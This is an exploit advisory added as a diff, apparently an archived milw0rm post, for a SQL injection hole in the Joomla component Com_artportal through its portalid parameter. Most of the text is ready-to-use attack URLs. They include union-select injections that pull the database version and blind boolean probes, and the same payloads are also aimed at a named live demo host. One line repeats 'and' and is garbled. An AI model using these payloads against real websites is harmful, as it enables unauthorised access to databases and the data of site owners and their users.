@@ -1,0 +1,49 @@
+_00000__00000__00000__00000__0___0__00000____0___0___000___0___0_
+_0______0___0__0___0__0______00_00__0________00_00__0___0__00_00_
+_0000___00000__00000__00000__0_0_0__00000____0_0_0__0___0__0_0_0_
+_____0______0______0__0______0___0__0________0___0__00000__0___0_
+_0000___00000__00000__00000__0___0__00000____0___0__0___0__0___0_
+_________________________________________________________________
+
+
+
+# [+] Joomla Compenent Com_artportal (portalid) Remote SQL Injection Vulnerabilities
+# [+] Software : Joomla Compenent Com_artportal
+# [+] Author : 599eme Man
+# [+] Contact : Flouf@live.fr
+# [+] Thanks : Moudi, Kim, Neocoderz, Sheiry, Shimik Root aka Str0zen, Pr0H4ck3rz, Staker, Security-shell...
+#
+#[------------------------------------------------------------------------------------]
+# 
+# [+] Vulnerability
+#
+#	[+] SQL
+#
+#		- http://www.site.com/index.php?option=com_artportal&portalid=1 union all select 1,2,3,4,5,6,version(),8,9--
+#
+#			[+] Demo
+#
+#				- http://demo.artetics.com/index.php?option=com_artportal&portalid=1%20union%20all%20select%201,2,3,4,5,6,version(),8,9--
+#
+#	[+] Blind SQL
+#
+#		- http://www.site.com/index.php?option=com_artportal&portalid=1 and 1=2 => False
+#		- http://www.site.com/index.php?option=com_artportal&portalid=1 and and 1=1 => True
+#
+#		- http://www.site.com/index.php?option=com_artportal&portalid=1 and substring(@@version,1,1)=4 => False
+#		- http://www.site.com/index.php?option=com_artportal&portalid=1 and substring(@@version,1,1)=5 => True
+#
+#			[+] Demo
+#
+#				- http://demo.artetics.com/index.php?option=com_artportal&portalid=1 and 1=2 => False
+#				- http://demo.artetics.com/index.php?option=com_artportal&portalid=1 and 1=1 => True
+#
+#				- http://demo.artetics.com/index.php?option=com_artportal&portalid=1 and substring(@@version,1,1)=4 => False
+#				- http://demo.artetics.com/index.php?option=com_artportal&portalid=1 and substring(@@version,1,1)=5 => True
+#
+#
+#[------------------------------------------------------------------------------------]
+#
+#########################################################################################################
+
+# milw0rm.com [2009-09-01]
